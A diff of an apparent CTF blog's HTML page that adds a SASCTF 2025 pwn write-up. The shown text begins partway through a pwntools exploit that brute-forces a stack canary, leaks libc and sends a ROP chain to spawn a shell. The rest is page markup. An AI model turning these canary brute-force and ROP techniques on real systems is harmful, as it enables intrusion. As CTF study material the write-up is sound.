send_child(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">            a = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">b&quot;lost&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;canary&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;yourself&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg()</span></span><br><span class="line">    payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>, canary, <span class="number">0x400778</span>+<span class="number">8</span>, <span class="number">0x004012D4</span>)</span><br><span class="line">    send_child2(payload)</span><br><span class="line">    libc_base = leak_address() - <span class="number">0x8ce80</span></span><br><span class="line">    leak_ex2(libc_base)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    pop_rdi_addr = libc_base + <span class="number">0x11903c</span></span><br><span class="line">    pop_rsi_addr = libc_base + <span class="number">0x11a3fd</span></span><br><span class="line">    pop_rdx_addr = libc_base + <span class="number">0x67e22</span></span><br><span class="line">    pop_rax_addr = libc_base + <span class="number">0x84dff</span></span><br><span class="line">    syscall_addr = libc_base + <span class="number">0x9e276</span></span><br><span class="line">    gadget_addr = libc_base + <span class="number">0x9d9c5</span> <span class="comment">#mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></span><br><span class="line">    free_hook_addr = libc_base + <span class="number">0x218148</span></span><br><span class="line">    malloc_hook_addr = libc_base + <span class="number">0x218140</span></span><br><span class="line">    system_addr = libc_base + <span class="number">0x5af30</span></span><br><span class="line">    bin_sh_addr = libc_base + <span class="number">0x1d944a</span></span><br><span class="line">    setcontext_addr = libc_base + <span class="number">0x4ae10</span></span><br><span class="line"></span><br><span class="line">    payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>, canary, <span class="number">0</span>, pop_rdi_addr+<span class="number">1</span>,  pop_rdi_addr, bin_sh_addr, libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    send_child2(payload)</span><br><span class="line"></span><br><span class="line">    ia()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+</div>
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/04/07/NCTF2025/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-05-27T12:00:01+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>本页文档最后更新于：May 27, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
-    
-  </section>
+        
+          
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/bruteforce-canary/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>bruteforce canary</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/type-confusion/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>type confusion</p></a></div>
+  <span hidden itemprop="keywords">bruteforce canary type confusion</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/&title=SASCTF 2025 Quals Pwn - blog&summary=forking..."
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/&title=SASCTF 2025 Quals Pwn - blog&summary=forking..."
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/&title=SASCTF 2025 Quals Pwn - blog&summary=forking..."
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/04/27/ACTF2025/'>
+          <p class='title'>ACTF2025<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Pwnonly_read题目功能
+漏洞点由于是libc 2.34+编译，elf中已经没有csu等常见gadget，唯一可利用的是leave，可以用来控制rbp。又因为取buf地址时通过计算rbp...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
   
 
 
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2025/05/27/SASCTF2025Quals/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-  
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2819,106 +2968,48 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box circle' href='/about/'>
-          <img no-lazy src='/images/author.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>St4ckC00ki3</h2>
-        
-        
-          <p>defect.run( )</p>
-
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/StackC00ki3/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:botdebug@outlook.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop pjax">
-    
-
-    <div class='content'>
-      <a href="/tags/ROP/" style="font-size: 14px; color: #999">ROP</a> <a href="/tags/bof/" style="font-size: 24px; color: #555">bof</a> <a href="/tags/bruteforce-canary/" style="font-size: 14px; color: #999">bruteforce canary</a> <a href="/tags/calloc/" style="font-size: 14px; color: #999">calloc</a> <a href="/tags/cgi/" style="font-size: 14px; color: #999">cgi</a> <a href="/tags/fmt/" style="font-size: 14px; color: #999">fmt</a> <a href="/tags/heap-overflow/" style="font-size: 24px; color: #555">heap overflow</a> <a href="/tags/house-of-apple-3-%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83/" style="font-size: 24px; color: #555">house of apple 3 + 一骑当千</a> <a href="/tags/integer-overflow/" style="font-size: 14px; color: #999">integer overflow</a> <a href="/tags/leakless/" style="font-size: 24px; color: #555">leakless</a> <a href="/tags/no-gadget/" style="font-size: 14px; color: #999">no gadget</a> <a href="/tags/off-by-one/" style="font-size: 14px; color: #999">off by one</a> <a href="/tags/orw/" style="font-size: 24px; color: #555">orw</a> <a href="/tags/ptrace/" style="font-size: 14px; color: #999">ptrace</a> <a href="/tags/ret2dlresolve/" style="font-size: 14px; color: #999">ret2dlresolve</a> <a href="/tags/sandbox/" style="font-size: 14px; color: #999">sandbox</a> <a href="/tags/seccomp/" style="font-size: 14px; color: #999">seccomp</a> <a href="/tags/sgx/" style="font-size: 14px; color: #999">sgx</a> <a href="/tags/type-confusion/" style="font-size: 14px; color: #999">type confusion</a> <a href="/tags/uaf/" style="font-size: 14px; color: #999">uaf</a> <a href="/tags/vsyscall/" style="font-size: 14px; color: #999">vsyscall</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">命令注入</a>
-    </div>
-  </section>
-
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-Type"><span class="toc-number">1.</span> <span class="toc-text">My Type</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.</span> <span class="toc-text">题目功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mickey-1337"><span class="toc-number">2.</span> <span class="toc-text">Mickey 1337</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%8A%9F%E8%83%BD-1"><span class="toc-number">2.2.</span> <span class="toc-text">题目功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.5.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2986,13 +3077,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -4144,7 +4236,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"blog","url":"https://stackc00ki3.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://stackc00ki3.github.io/","name":"blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://stackc00ki3.github.io/tags/integer overflow/","name":"integer overflow"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"blog","url":"https://stackc00ki3.github.io/","keywords":null,"description":"","author":{"@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/","description":""},"publisher":{"@type":"Organization","name":"blog","url":"https://stackc00ki3.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://stackc00ki3.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/"},"publisher":{"@type":"Organization","name":"blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"blog","url":"https://stackc00ki3.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://stackc00ki3.github.io/","name":"blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/","name":"SASCTF 2025 Quals Pwn"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"blog","url":"https://stackc00ki3.github.io/","keywords":null,"description":"","author":{"@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/","description":""},"publisher":{"@type":"Organization","name":"blog","url":"https://stackc00ki3.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://stackc00ki3.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SASCTF 2025 Quals Pwn","description":"forking...","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/"},"author":{"@type":"Person","name":"St4ckC00ki3","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://stackc00ki3.github.io/"},"publisher":{"@type":"Organization","name":"blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/","wordCount":10,"datePublished":"2025-05-27T03:44:58.000Z","dateModified":"2025-05-27T04:00:01.798Z","keywords":"bruteforce canary,type confusion","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
